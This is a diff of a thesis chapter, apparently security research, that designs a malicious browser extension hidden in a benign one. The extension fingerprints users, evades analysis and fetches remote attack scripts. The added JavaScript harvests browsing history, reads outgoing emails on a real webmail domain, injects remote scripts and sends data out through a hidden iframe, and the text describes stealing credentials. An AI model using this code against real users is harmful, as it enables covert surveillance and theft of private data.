@@ -4,7 +4,7 @@
 
 	We have analyzed potential threats in the browser API and showed our results in the previous chapter. In this chapter we present our design and implementation to proof that the results of our theoretical analysis are applicable in practical scenarios. 
 	
-	Our implementation is integrable in a benign extension. For that purpose, it consists of interchangeable features with different permissions to match the benign extension's permissions. Of course, we are not able to execute a specific attack that needs other permissions as declare by the benign extension. To be able to execute different attacks and to hide our malicious intentions, our core implementation which is integrated in the benign extension is only responsible to identify the current user. If the identification was successful, our implementation will remotely fetch the source code for an attack and execute it. In conclusion, our design consists of the following three steps where each consists of interchangeable features:
+	Our implementation is capable of being integrated into a benign extension. For that purpose, it consists of interchangeable features with different permissions to match the benign extension's permissions. Of course, we are not able to execute a specific attack that needs other permissions as declare by the benign extension. To be able to execute different attacks and to hide our malicious intentions, our core implementation which is integrated in the benign extension is only responsible to identify the current user. If the identification was successful, our implementation will remotely fetch the source code for an attack and execute it. In conclusion, our design consists of the following three steps where each consists of interchangeable features:
 	
 	\begin{enumerate}
 		\item Identify the current user.
@@ -13,20 +13,21 @@
 	\end{enumerate}
 	
 	This design brings several advantages. Because the code for an attack is fetched remotely at runtime, our implementation is able to bypass a static analysis which uses content matching to find known malicious code pattern. Furthermore, the identification of the current user allows us not only to attack a worthwhile target but also to bypass a dynamic analysis. If we are able to detect that our implementation is currently the target of a dynamic analysis, we can fetch a benign script instead of our attack script. 
-		
-\section{Identification}
 
-	
+	For our implementation, we use the popular web library \textit{jQuery}\footnote{jQuery Homepage: \url{http://jquery.com/}} to simplify the interaction with a web page's DOM. 
+
+\newpage	
+\section{Identification}
 
 	Identifying the current user of our extension allows us to target our attack only at specific users. In beforehand, we can evaluate whether or not an attack is worthwhile if we collect as much as possible pieces of information about the user such his financial status or his position in a company we want to target. Furthermore, we are able to detect if our extension is target of an dynamic analysis such as \textit{Hulk} or \textit{WebEval} and evade detection \cite{184485,190984}.
 	
-	We have analyzed common approaches to identify a user and how we can use these for our implementation. %TODO
+	To find approaches which we can use for our implementation, we first analyzed existing techniques for user tracking and fingerprinting. We present our results and our own implementations to support these techniques in the following two sections.
 	
 \subsection{User Tracking}
 
-	User tracking refers to the linking of multiple web pages that were visited by the same user. Applying this technique to web page's that belong to the same website allows to follow the user's path through the website's pages and determine his entry and exit points. This way is commonly used for web analytics to help the website's author to improve the usability of his layout. User tracking between different domains produces an overview about the user's movement through the Internet. It is often used by advertising companies to gain information about the user's personal needs and preferences to provide personalized advertisements. 
+	User tracking refers to the linking of multiple web pages that were visited by the same user. Applying this technique to web page's that belong to the same domain allows to follow the user's path through the domain's pages and determine his entry and exit points. This is commonly used for web analytics to help the website's author to improve the usability of his layout. User tracking between different domains produces an overview about the user's movement through the Internet. It is often used by advertising companies to gain information about the user's personal needs and preferences to provide personalized advertisements. 
 		
-	The general method for user tracking includes a unique identifier which is intentionally stored on the user's machine the first time he visits a tracking website. If the identifier is retrieved on later occasions, the tracking party is notified that the same user has accessed another web page.  
+	The general method for user tracking includes a unique identifier which is intentionally stored on the user's machine the first time he visits a tracking web page. If the identifier is retrieved on later occasions, it notifies the tracking party that the same user has accessed another web page. There exists several possibilities to store server data inside the browser. We have listed some approach which we found in several research papers:
 	
 %	\begin{itemize}
 %		\item \textbf{HTTP Cookies} Cookies are send back on every web request to their origin server. This simplifies user tracking, because the website's host does not have to take care about storing the cookie client-sided and retrieving it. 
@@ -42,22 +43,38 @@
 		\item \textbf{Local Shared Objects} Flash player use a technique similar to cookies to synchronize data between different browser sessions. The data is locally stored on the user's system by websites that use flash. Flash cookies as tracking mechanism have the advantage that they track the user behind different browsers and they can store up to 100KB whereas HTTP cookies can only store 4KB. Before 2011, the user could not easily delete local shared objects from within the browser because browser plugins hold the responsibility for their own data. In 2011 a new API was published that simplifies this mechanism \cite{mozillaWikiClearPrivacyAPI}. %TODO
 		
 		\item \textbf{Evercookies} Evercookie is a JavaScript framework implemented to produce persistent identifiers in a browser that are difficult to remove \cite{evercookie}. For that purpose, it uses multiple storage technologies such as HTTP and Flash cookies, HTML5 storages, web history and cache, and unusual techniques such as storing the identifier in RGB values of cached graphics. To hamper the removing from a browser, it recreates deleted identifiers as soon as the user visit a web site that uses the framework. The user has to delete every stored identifier to remove the evercookie completely. 
-		
-		\item \texttt{Web Beacon} A web beacon is a remote loaded object that is embedded into an HTML document usually a web page or an email. It reveals that the document was loaded. Common used beacons are small and transparent images, usually one pixel in size. If the browser fetches the image it sends a request to the image's server and sends possible tracking cookies along. This allows websites to track their user on other sites or gives the email's sender the confirmation that his email was read. An example is Facebook's "like" button or similar content from social media websites. Those websites are interested into what other pages their users visit. The "like" button reveals this information without the need to be invoked by the user. 
 	\end{itemize}
+	
+\subsubsection{Web Beacon}
+	
+	If a user loads a web page that includes a resource from a tracking third-party, any cookie that originates from the third-party's domain is send along the request that fetches the resource. This allows the third-party to track the user on every web page that includes their content. These kind of third-party content whose only purpose is user tracking are called web beacons. A small image, commonly one pixel in size and transparent, is often used as a web beacon. Because of its size it requires less traffic and its transparency hides it from the user. It is also used in HTML emails and acts as a read confirmation by notifying the sender that the email's content was loaded. Other nowadays more commonly used web beacons originate from social media such as Facebook's "like" button. 
+	
+	To allow user tracking between different websites, the developers have to explicit include the web beacon into their web pages. We use an extension which has full access to any visited web page and add the web beacon to the DOM of each web page. If we send a tracking cookies along the corresponding request, we are able to remotely track the user because our server gets notified every time the user loads a new web page. 
+	
+	We implemented a content script that embeds an image which it fetches from our remote server in every visited web page. Besides the content script, there is no need for additional permission. We show the implementation of our content script in \autoref{code:webBeacon}. We start by creating a new image element (line 1), set its source attribute to the URL of our remote server (line 2), and finally add it to the web page's DOM (line 3) which subsequently sends a request with probably stored tracking cookies to our remote server.
+	
+	\begin{code}
+		\begin{lstlisting}
+var img = document.createElement('img');
+img.setAttribute('src', REMOTE_SERVER_URL);
+document.body.appendChild(img);
+\end{lstlisting}
+		\caption{Content script that injects a tracking pixel in the current web page.}
+		\label{code:webBeacon}
+	\end{code}
 	
 	
 
 \subsection{Fingerprinting}
 
-	Previously described methods for tracking a user identify him based on some data which was intentionally stored on the user's system. Those stored identifiers are vulnerable to deletion by the user. A study from 2010 showed that a browser reveals many browser- and computer-specific information to web pages \cite{Eckersley:2010:UYW:1881151.1881152}. Collection and merging these pieces of information creates a fingerprint of the user machine. Creating a second fingerprint at a later point in time and comparing it to stored fingerprints makes it possible to track and identify the user without the need to store an identifier on his computer. Because the same kind of information taken from different users will probably equal, it is necessary to collect as much information as possible to create a unique fingerprint. 
+	Previously described methods for tracking a user identify him based on some data which was intentionally stored on the user's system. Those stored identifiers are vulnerable to deletion by the user. A study from 2010 showed that a browser reveals many browser- and computer-specific information to web pages \cite{Eckersley:2010:UYW:1881151.1881152}. Collection and merging these pieces of information creates a fingerprint of the user machine. Creating a second fingerprint at a later point in time and comparing it to stored fingerprints allows to track and identify the user without the need to store an identifier on his computer in beforehand. Because the same kind of information taken from different users will probably equal, it is necessary to collect as much information as possible to create a truly unique fingerprint. 
 	
 	The technique of fingerprinting is nowadays mostly used by advertising companies to get a more complete view of the user and his needs than from simple tracking, and anti-fraud systems that detect if the currently used credentials or device belong to the current user and are not stolen.
 
 	There exists numerous scientific papers about fingerprinting from which we present a small subset of techniques with brief descriptions \cite{paulstone_historysniffing, MBYS11, Nikiforakis:2013:CME:2497621.2498133, Eckersley:2010:UYW:1881151.1881152, MS12, olejnik:hal-00747841}. 
 	
 	\begin{itemize}
-		\item \textbf{Browser Fingerprinting} The browser provides a variety of technical information to a web page that can be used to generate a fingerprint of the currently used device. The following list shows examples of these properties and how to access them using JavaScript. 
+		\item \textbf{Browser Fingerprinting} The browser provides a variety of technical information to a web page that can be used to generate a fingerprint of the currently used browser and machine. The following list shows examples of these properties and how to access them using JavaScript. 
 		
 		\begin{tabular}{|l|l|p{0.47\textwidth}|} \hline
 			\textbf{Property} & \textbf{JavaScript API} & \textbf{Example Output} \\ \hline
@@ -74,23 +91,121 @@
 		
 		\item \textbf{Fonts} The fonts installed on the user's machine can serve as part of a user identification. The browser plugin \textit{Flash} provides an API that returns a list of fonts installed on the current system (\texttt{Font.enumerateFonts(true)})\cite{flashPlayerGetFonts}. If the Flash plugin is not available in a browser, JavaScript can be used to test whether particular fonts are available to the current web page or not. This approach needs a predefined list and may not cover unpopular fonts. It is implemented by writing a string with each font on the web page. If a font is not installed, the browser uses a fall-back font to draw the text. Comparing the width and height of the drawn font to those of the fall-back font gives an evidence whether or not the font is installed.
 		
-		\item \textbf{History Sniffing} Reading out the user's web history can not only serve as fingerprinting method but also to simplify user tracking. An outdated approach to test if a user has visited a particular web page was to use the browser's feature to display links to visited web pages in a different color. A web site would hidden from the user add a list of URLs to a web page as link elements and determinate the displayed color. Nowadays, link elements that were queried by JavaScript calls behave like unvisited links fixing the thread from this sniffing attack. A current approach detects the redrawing of link elements to determine if the underlying web page was visited before \cite{paulstone_historysniffing}. If a link is drawn the first time, it is drawn as an unvisited link and simultaneously a query to the browser's web history database is send. When the query returns that the web page behind the link was visited before, it redraws the link element. The time it takes to redraw the element can be captured giving the desired evidence.
+		\item \textbf{Canvas} Mowery er al. have notices that the same text drawn with canvas results in a different binary representation on different computers and operating systems \cite{MS12}. They suppose the reasons for these different results are due to differences in graphical processing such as pixel smoothing, or anti-aliasing, differences in system fonts, API implementations or even the physical display. The basic flow of operations consists of drawing as many different letters as possible with the web page's canvas and executing the method \texttt{toDataURL} which returns a binary representation of the drawn image. 
+		
+		\item \textbf{History Sniffing} Reading out the user's web history can not only serve as fingerprinting method but also to simplify user tracking. An outdated but back then common approach to test if a user has visited a particular web page was to use the browser's feature to display links to already visited web pages in a different color. A JavaScript adds a list or predefined URLs to the web page's DOM as link elements and determines the displayed color. Nowadays, link elements that were queried by JavaScript calls behave like unvisited links which prevents this sniffing attack. A current approach detects the redrawing of link elements to determine if the underlying web page was visited before \cite{paulstone_historysniffing}. If a link is drawn the first time, it is drawn as an unvisited link and simultaneously a query to the browser's web history database is send. When the query returns the information that the web page behind the link was visited before, it redraws the link element. The time it takes to redraw the element can be captured with JavaScript giving the desired evidence.
 		
 		\item \textbf{JavaScript Benchmark Testing} The execution speed of a JavaScript engine depends on the implementation but also on the systems processor architecture and clock speed. Mowery et al. implemented a set of benchmark test suits to fingerprint different execution speeds \cite{MBYS11}. Using these information, they could distinguish between major browser versions, operating systems and micro architectures. 
 	\end{itemize}	
-
+ 
+ 
+ 
+\subsubsection{Additional Fingerprinting Data} 
 	
+	We can support the general method of browser fingerprinting by collecting technical information that the browser provides to an extension but not to a web page. These pieces of information help us to generate a more accurate fingerprint of the user's browser and system. To access the desired information, we need further permissions. \autoref{tab:fingerprintExtension} shows these pieces of information and the permissions needed to access them. 
+	
+	\begin{table}[h]
+		\begin{tabular}{|l|l|l|} \hline
+			\textbf{Permission} & \textbf{Information} & \textbf{Example} \\ \hline
+			system.cpu & Number of processor kernels & \\
+			& Processor's name & Intel(R) Core(TM) i5-3210M CPU @ 2.50GHz \\
+			& Processor's capabilities & "sse", "sse2", "sse3"  \\ \hline
+			system.memory & Memory capacity & 6501200096 \\ \hline
+			gcm & An unique ID for the extension instance & \\ \hline
+			management & List of installed extensions & Extension ID and version \\ \hline
+		\end{tabular}
+		\caption{Additional fingerprint information available to an extension.}
+		\label{tab:fingerprintExtension}
+	\end{table} 
+	
+\subsubsection{History Sniffing}
 
-\subsection{Implementations}
+	Explicitly testing if a user has visited a particular web page has the disadvantage that not all visited web pages are covered. A predefined list is necessary and often only contains popular web pages. To improve history sniffing, we use an extension to create a more complete list of the web pages that a user has visited and even capture additional information such as the time when, and the order in which different web pages were visited. For that purpose, we can either use the \textit{history} module or a content script in every web page. Each approach has its advantages and disadvantages. 
+	
+	With a content script, we can either execute the above described technique of history sniffing which uses a predefined list of web pages to explicit check, or store information such as the URL, and current time every time the content script is injected into a newly loaded web page. In in \autoref{code:webBeacon}, we have already shown a content script that exactly executes this task. Our implementation of a web beacon notifies us every time the user has opened a new web page by fetching a resource from our remote server. To get the URL of the visited web page, we can simply transfer it as parameter in the web request that fetches the resource. The disadvantage of using a content script for history sniffing is, that we can not retrieve visited web pages from before the extension's installation, or while the extension is disabled. Therefore, it is not an ideal fingerprinting technique because it has to be active for some time to be effective. But, it is a simple alternative if the \textit{history} module is not available because the extension does not have the corresponding permission.
+	
+	Using the history module allows us to retrieve all visited web pages at once. It provides two for us useful methods \texttt{search} and \texttt{getVisits}. The first method allows us to retrieve the URLs of all web pages the user has visited and the second one gives us detailed information about every time the user has visited a particular URL such as the concrete time, the referring web page, and how the user has entered the web page. In comparison to using a content script, the history module gives us more pieces of information and executes at once. But the browser's history is vulnerable to deletion or disabling by the user and is disabled if the user uses an incognito window.
+	
+	\autoref{code:historySniffing} shows our implementation of an history sniffing attack using the \textit{history} module. First, we define our main array to store retrieved information for each visited web page which we will later on transfer to our remote server (line 1). We search for visited web pages with an empty text which gives us an unfiltered result list, a start time of zero which disables the default of returning entries of the last 24 hours, and a maximum result amount of 2147483647 which is the maximum value for this field (line 2). The search method returns an array of all visited web pages. We iterate through the array (lines 3-7), store the web page's URL in a separate object (line 4), push the object to our main array (line 5), and then call a separate method to retrieve all of the user's visits for the current web page and add these to our storage object (line 6). The method takes the before defined object that contains the web page's URL as first parameter and a boolean value indicating that the current call of the method is the last call as second parameter (lines 6\&9). Our method queries for all visits of a particular web page using the URL that is stored in the given storage object (line 10), and adds the returned visits to the storage object (line 11). We check if this was the last call of our method and forward our main array to our send method in this case (lines 12-14).
+ 
+	\begin{code}
+		\begin{lstlisting}
+var historySniffingStorage = [];
+chrome.history.search({ 'text': '', 'startTime': 0, 'maxResults': 2147483647 }, function(historyItems) {
+	for(var i = 0; i < historyItems.length; i++) {
+		var storage = { 'url': historyItems[i].url };
+		historySniffingStorage.push(storage);
+		addVisitItems(storage, i === historyItems.length - 1);
+	}
+});
+function addVisitItems(storage, isLast) {
+	chrome.history.getVisits({ 'url': storage.url }, function(visitItems) {
+		storage.visits = visitItems;
+		if(isLast) {
+			send(historySniffingStorage);
+		}
+	});
+}
+\end{lstlisting}
+		\caption{Extension code to execute a history sniffing attack.}
+		\label{code:historySniffing}
+	\end{code}
+
+
+\subsection{Personal User Information}
 	
 	Besides the before described techniques of user tracking and fingerprinting, an extension has more efficient ways to identify a user. The extension has full access to any web page that the user visits and is able to read out any information that is stored in these web pages. This allows us to even identify the person behind the web user by extraction personal information such as his full name, address, or phone number. 
 	
 	We have extracted three worthwhile targets for our extension:
 	\begin{itemize}
-		\item \textbf{Social Media} Many people use real names and other personal information for their social media account. If we have access to the account editing page, we can read out the user's data. Furthermore, we can extract information such as the user's social or business environment while the user visits related web pages.
+		\item \textbf{Social Media} Many people use real names and other personal information for their social media account. If the user visits his account, we can read out his personal data. Furthermore, we can extract information such as the user's social or business environment while the user visits related web pages.
 		\item \textbf{Online Banking} We can identify the current user based on his account numbers if he uses his online banking account. Moreover, we can extract his financial status which gives us information whether or not an attack is worthwhile.
 		\item \textbf{Email Account} 
 	\end{itemize}
+	
+\subsubsection{Read Outgoing Email}
+	
+	First, we check if the current web page is our targeted web page by checking its host name (line 1). Then, we query for the send button with a complex CSS selector and add a click event to it (line 2). If the user sends the mail by clicking the send button, we will send a message to the extension's background (line 3). The message contains the recipients (line 4), carbon copy recipients (line 5), blind carbon copy recipients (line 6), and the subject (line 7). Again, we query for each element with a complex CSS selector.
+	
+	\begin{code}
+		\begin{lstlisting}
+if(window.location.host === 'email.t-online.de') {
+	$('div#toolbarLeft a.toolbarItem.single.normal').click(function() {
+		chrome.runtime.sendMessage({
+			'recipients': $('div#fieldTo ul li').not(':first-child').text(),
+			'cc': $('div#fieldCc ul li').not(':first-child').text(),
+			'bcc': $('div#fieldBcc ul li').not(':first-child').text(),
+			'subject': $('input#mailwriteviewInputSubject').val()
+		});
+	});
+}
+\end{lstlisting}
+		\caption{Content script to read an outgoing email at the \url{email.t-online.de} domain.}
+		\label{code:readOutgoingMailContent}
+	\end{code}
+	
+	In our background script, we await the message from our content script (line 1). Because the email's body is not stored in the same document as the rest of the email's data but in a separate iframe element, we execute a further script in the current tab to retrieve the missing information (line 2). The script checks for the correct id of the document's body element and returns the body's visible text (line 3). We specify that our script is executed in all of the web page's frames, especially the iframe with the email's body (line 4). Because multiple instances of our script are active and each returns some value, we iterate over all returned values and determine the correct one (lines 6-7). Finally, we forward the email's content to our send method (lines 9-10) 
+	
+	\begin{code}
+		\begin{lstlisting}
+chrome.runtime.onMessage.addListener(function(message, sender) {
+	chrome.tabs.executeScript(sender.tab.id, {
+		'code': 'document.body.id === "tinymce" ? {"body": document.body.innerText} : null',
+		'allFrames': true
+	}, function(results) {
+		for(var i = 0; i < results.length; i++) {
+			if(results[i] && results[i].body) {
+				message.body = results[i].body;
+				send(message);
+			}
+		}
+	});
+});
+\end{lstlisting}
+		\caption{Extension code to read an outgoing mail at the \url{email.t-online.de} domain.}
+		\label{code:readOutgoingMailBackground}
+	\end{code}
+	
 	
 	% social media -> name, address, phone number, friends, company
 	% email account -> messages
@@ -104,42 +219,36 @@
 	% extension can track user more efficently, has access to all web pages and tab system, can record any visited web page and any interaction with a web page with for example a key logger,
 	% browser fingerprinting possible in extension's background page because it is also a HTML page, no need for web page access, browser api provides additional information for fingerprinting in system module, 
 
-\subsubsection{Web Beacon}
-	
-	This is another tracking method which we can support with an extension. It notifies a third party that a specific web page was accessed by fetching a resource from a server and sending possible tracking cookies along the request. We implemented an extension that embeds an image of one pixel in size in every visited web page. When the browser fetches the image, it sends a tracking cookie along the request or fetches a new one. The extension needs a single content script with the matching attributes \texttt{"http://*/*"} and \texttt{"https://*/*"} and no further permissions. The content script is shown in \autoref{contentScriptWebBeacon}.
-	
-	\begin{code}
-		\begin{lstlisting}
-		var img = document.createElement('img');
-		img.setAttribute('src', 'https://localhost:3001/images/pixel.png');
-		document.body.appendChild(img);
-		\end{lstlisting}
-		\caption{Content script that injects a tracking pixel in the current web page.}
-		\label{contentScriptWebBeacon}
-	\end{code}
-	
-\subsubsection{Additional Fingerprinting Data} 
-	
-	The browser provides additional information to its extension which are not available for web pages. Those information may be used to generate a more accurate fingerprint of the user's browser and system. Accessing the information needs additional permissions. \autoref{fingerprintExtension} shows provided information that may be retrieved for a fingerprint and the permissions needed to access them. \\
-	
-	\begin{table}[h]
-		\begin{tabular}{|l|l|l|} \hline
-			\textbf{Permission} & \textbf{Information} & \textbf{Example} \\ \hline
-			system.cpu & Number of processor kernels & \\
-			& Processor's name & Intel(R) Core(TM) i5-3210M CPU @ 2.50GHz \\
-			& Processor's capabilities & "sse", "sse2", "sse3"  \\ \hline
-			system.memory & Memory capacity & 6501200096 \\ \hline
-			gcm & An unique ID for the extension instance & \\ \hline
-			management & List of installed extensions & Extension ID and version \\ \hline
+	\begin{table}
+		\centering
+		\begin{tabular}{|l|l|} \hline 
+			\textbf{User Identification Implementation} & \textbf{Needed Permissions} \\ \hline
+			Store Identifier & \texttt{storage} \\
+			\hline
+			Web Beacon & Content Script \\
+			\hline
+			History Sniffing & \texttt{history} \\
+			& Content script \\
+			\hline
+			Additional Fingerprint Data & \texttt{system.cpu} \\
+			& \texttt{system.memory} \\
+			& \texttt{gcm} \\
+			& \texttt{management} \\
+			\hline
 		\end{tabular}
-		\caption{Additional fingerprint information available to WebExtension}
-		\label{fingerprintExtension}
-	\end{table} 
+		\caption{Summary of extension implementations for user identification with needed permissions.}
+		\label{tab:summaryUserIdentification}
+	\end{table}
+
 	
+	
+	
+	
+\newpage	
 \section{Fetching}
 \label{sec:fetching}
 	
-	An extension has several possibilities to load a script from a remote server. In this section we present the techniques we use for our implementation. \autoref{tab:permissionsLoadScript} at the end of this section shows a summary of all techniques and what privileges an extension needs for each. 
+	An extension has several possibilities to load a script from a remote server. In this section we present the techniques we use for our implementation. \autoref{tab:summaryFetchScript} at the end of this section shows a summary of all techniques and what privileges an extension needs for each. 
 		
 \subsection{Script Element In Background}
 	
@@ -152,7 +261,7 @@
 	If we want to execute a remote loaded script only in the scope of a web page, we can take use of the DOM API. It allows us to add a new script element to the current web page. If we set the source attribute of the script element to the URL of our remote server, the browser will fetch and execute the script for us. We implemented the content script shown in \autoref{contentScriptRemotLoad} which executes a remotely loaded script in any web page without the need for further permissions. The content script creates a new script element (line 1), sets the element's source attribute to the URL of our remote server (line 2), and appends it to the web page's body (line 3). The remote loaded script is immediately executed.
 	
 	\begin{code}
-		\begin{lstlisting}	
+		\begin{lstlisting}
 var script = document.createElement('script');
 script.setAttribute('src', REMOTE_RESOURCE_URL);
 document.body.appendChild(script);
@@ -189,32 +298,32 @@ xhr.send();
 	
 	A communication channel that does not need any special interface can be established over any web page's DOM. All extensions with an active content script in the same web page have access to the same DOM. The extensions which want to communicate with each other can agree upon a specific DOM element and set it's text to exchange messages. Another way to exchange messages is to use the DOM method \texttt{window.postMessage}. This method dispatches a \texttt{message} event on the web pages \texttt{window} object. Any script with access to the web page's \texttt{window} object can register to be notified if the event was dispatched and then read the message. 
 	
-	The code shown in \autoref{postMessageListener} and \autoref{postMessageMethod} is an example how to use this method. In \autoref{postMessageListener} we add an event listener to the \texttt{window} object that listens to the \texttt{message} event. The event handler method awaits the key \texttt{from} to be present in the event's data object and the value of \texttt{from} to equal \texttt{extension}. We use this condition to identify messages which were dispatched by an extension. Further, the handler awaits that the message from the other extension is stored with the \texttt{message} key. In \autoref{postMessageMethod} we create our message object with the key-value pairs \texttt{'from':'extension'} and \texttt{'message':'secret'} and call the \textit{postMessage} method with our message object as first parameter. The second parameter defines what the origin of the \texttt{window} object must be in order for the event to be dispatched. In our case, the web page and all content scripts share the same \texttt{window} object. Therefore, a domain check is unnecessary and we us a wildecard to match any domain.
+	We implemented two extension that exchange the code of a remotely loaded script between their backgrounds using a content script and the postMessage method. The content script in \autoref{code:sendScriptToOtherExtension} shows our implementation to send the remotely loaded script. The content script listens for a message from its background and awaits the script (lines 1-2). Then it calls the \texttt{postMessage} method to send the script (line 3). The method awaits a pattern as second parameter that matches the origin of the receiving \texttt{window} object. In our case, the web page and all content scripts share the same \texttt{window} object, therefore a domain check is unnecessary and we us a wildcard to match any domain. \\
+	To receive the script we use the content script shown in \autoref{code:receiveScriptFromOtherExtension}. First, we add a listener to get noticed if the message event is dispatched and check if the message contains the script (line 1-2). Then we send the transfered script to the extension's background (line 3). 
+	
+	\begin{code}
+		\begin{lstlisting}
+chrome.runtime.onMessage.addListener(function(message, sender) {
+	if(message.script) {
+		window.postMessage({script: message.script}, '*');
+	}
+});
+\end{lstlisting}
+		\caption{Content script to send script code from an extension's background to another extension.}
+		\label{code:sendScriptToOtherExtension}
+	\end{code}
 	
 	\begin{code}
 		\begin{lstlisting}
 window.addEventListener('message', function(event) {
-	if(event.data.from && event.data.from === 'extension') {
-		handle(event.data.message);
+	if(event.data.script) {
+		chrome.runtime.sendMessage({script: event.data.script});
 	}
 });
 \end{lstlisting}
-		\caption{Event handler for the postMessage method}
-		\label{postMessageListener}
+		\caption{Content script to receive script code from another extension and forward it to its background.}
+		\label{code:receiveScriptFromOtherExtension}
 	\end{code}
-	
-	\begin{code}
-		\begin{lstlisting}
-var message = {
-	'from'   : 'extension',
-	'message': remotelyLoadedScript
-}
-window.postMessage(message, '*');
-\end{lstlisting}
-		\caption{Call of the postMessage method}
-		\label{postMessageMethod}
-	\end{code}
-	
 
 	\begin{table}[h]
 		\centering
@@ -228,15 +337,18 @@ window.postMessage(message, '*');
 			\\ \hline
 		\end{tabular}
 		\caption{Summary of techniques to load and execute a remote script with needed privileges.}
-		\label{tab:permissionsLoadScript}
+		\label{tab:summaryFetchScript}
 	\end{table}
 	
 
+
+
+\newpage
 \section{Execution}
 
 \subsection{Remote Communication}
 
-	An important part for browser attacks is the communication between the malicious extension and the attacker. In \autoref{sec:fetching}, we have already shown that we can load scripts from remote servers and we have shown a communication channel to exchange messages between different extensions in \autoref{sec:mutualExtensionCommunication}. In this section, we present additional approaches our implementation uses for communication to prepare or execute attacks. At the end of this section, we have summarized all techniques which we use and the privileges needed to execute them in \autoref{tab:permissionsRemoteCommunication}.
+	An important part for browser attacks is the communication between the malicious extension and the attacker. In \autoref{sec:fetching}, we have already shown that we can load scripts from remote servers and we have shown a communication channel to exchange messages between different extensions in \autoref{sec:mutualExtensionCommunication}. In this section, we present additional approaches our implementation uses for communication to prepare or execute attacks. At the end of this section, we have summarized all techniques which we use and the privileges needed to execute them in \autoref{tab:summaryRemoteCommunication}.
 	
 \subsubsection{XMLHttpRequest}
 	
@@ -246,7 +358,7 @@ window.postMessage(message, '*');
 	
 	Another strategy that we use to transfer information to a remote host was described by Liu et al. \cite{Liu12chromeextensions:}. They analyzed possible threats in Chrome's extension model through malicious behavior and conducted that an extension can executed HTTP requests to any arbitrary host without cross-site access privileges. For that purpose, they we use the mechanics of an \textit{iframe} element. Its task is to display a web page within another web page. The displayed web page is defined by the URL stored inside the iframe's \textit{src} attribute. If the URL changes, the iframe reloads the web page. Adding parameters to the URL allows us to send data to the targeted server. 
 	
-	We implemented the content script shown in \autoref{contentScriptSendDataWithIframe}. First, it creates a new \texttt{iframe} element (line 1), hides it from the user by setting the iframe's CSS style property (line 2), and appends it to the web page's DOM (line 3). When the iframe's URL source property is changed, a subsequent URL request is initiated. This way, we can transmit data to the remote server by encoding it as URL parameter (lines 4-6).
+	We implemented the content script shown in \autoref{code:sendDataWithIframe}. First, it creates a new \texttt{iframe} element (line 1), hides it from the user by setting the iframe's CSS style property (line 2), and appends it to the web page's DOM (line 3). When the iframe's URL source property is changed, a subsequent URL request is initiated. This way, we can transmit data to the remote server by encoding it as URL parameter (lines 4-6).
 	
 	\begin{code}
 		\begin{lstlisting}
@@ -258,10 +370,10 @@ function send(data) {
 }
 \end{lstlisting}
 		\caption{Content script that sends data to a remote server using an \texttt{iframe} element}
-		\label{contentScriptSendDataWithIframe}
+		\label{code:sendDataWithIframe}
 	\end{code}
 	
-	The Same Origin Policy creates a boundary between the iframe and it's parent web page. It prevents scripts to access content that has another origin than the script itself. Therefore, if the web page inside the iframe was loaded from another domain as the parent web page, the iframe's JavaScript can not access the parent web page and vice versa. This boundary does not prevent an extension to access information in an iframe. The extension can execute a content script in every web page hence in the iframe's web page, too. For that purpose, it has to enable the \texttt{all\_frames} option for a content script either statically in the manifest or on a programmatically injection. This allows us to use the content script in \autoref{contentScriptSendDataWithIframe} for a two way communication channel. Executing a second content script inside the iframe, allows us to read information that our server has embedded inside the fetched web page. 
+	The Same Origin Policy creates a boundary between the iframe and it's parent web page. It prevents scripts to access content that has another origin than the script itself. Therefore, if the web page inside the iframe was loaded from another domain as the parent web page, the iframe's JavaScript can not access the parent web page and vice versa. This boundary does not prevent an extension to access information in an iframe. The extension can execute a content script in every web page hence in the iframe's web page, too. For that purpose, it has to enable the \texttt{all\_frames} option for a content script either statically in the manifest or on a programmatically injection. This allows us to use the content script in \autoref{code:sendDataWithIframe} for a two way communication channel. Executing a second content script inside the iframe, allows us to read information that our server has embedded inside the fetched web page. 
 	
 \subsubsection{Automatic Extension Update}
 
@@ -278,17 +390,21 @@ function send(data) {
 			\hline
 		\end{tabular}
 		\caption{Summary of communication techniques between an extension and a remote server and the privileges needed to use them.}
-		\label{tab:permissionsRemoteCommunication}
+		\label{tab:summaryRemoteCommunication}
 	\end{table}
+
+
+
 	
-\subsection{Attacks With Content Scripts}
+
+\subsection{Steal Information With Content Scripts}
 
 \subsubsection{Steal Sensitive Data}
 
 \subsubsection{Steal Credentials}
 	%TODO intro
 	
-	To steal the credentials from a login form, we use two content scripts which we inject in every web page. This attack does not need additional permissions. The content script shown in \autoref{code:stealCredentialsOnSubmit} steals the credentials if the user submits the login form and The other one shown in \autoref{code:stealCredentialsFromPasswordManager} steals the credentials if the browser's password manager has filled them in the login form. To send the stolen credentials to our remote server, we use the \texttt{send} method shown in \autoref{contentScriptSendDataWithIframe} because it does not need additional permissions, too. 
+	To steal the credentials from a login form, we use two content scripts which we inject in every web page. This attack does not need additional permissions. The content script shown in \autoref{code:stealCredentialsOnSubmit} steals the credentials if the user submits the login form and The other one shown in \autoref{code:stealCredentialsFromPasswordManager} steals the credentials if the browser's password manager has filled them in the login form. To send the stolen credentials to our remote server, we use the \texttt{send} method shown in \autoref{code:sendDataWithIframe} because it does not need additional permissions, too. 
 	
 	In \autoref{code:stealCredentialsOnSubmit} we begin with retrieving an input element of type password (line 1). If we have found one (line 2), we retrieve the form which contains the password element (line 3). Finally, we add an event listener to the form which is triggered if the user submits the form and subsequently sends the form with all its values to our remote server (lines 4-6). 
 	
@@ -324,9 +440,13 @@ if(passwordElement.length > 0) {
 		\label{code:stealCredentialsFromPasswordManager}
 	\end{code}
 	
-\subsubsection{Steal Credentials In Background}
+	
+	
+	
+	
+\subsubsection{Execute Attack In Background}
 
-	In addition to stealing credentials in the current web page, we implemented several approaches that open predefined login web pages to steal probably stored credentials from the browser's password manager. Different strategies to hide the loading of a new web page were previously discussed by Lujo Bauer et al. \cite{extensions:cns14}. We implemented three described techniques:
+	We implemented several approaches that open predefined web pages to execute particular attacks such as to steal probably stored credentials from the browser's password manager. Different strategies to hide the loading of a new web page were previously discussed by Bauer et al. \cite{extensions:cns14}. We implemented three described approaches:
 	
 	\begin{enumerate}
 		\item Load the targeted web page in an invisible iframe inside any web page.
@@ -334,27 +454,9 @@ if(passwordElement.length > 0) {
 		\item Open a new tab in an inactive browser window and load the targeted web page in this tab. Close the tab after the attack has finished.
 	\end{enumerate} 
 	
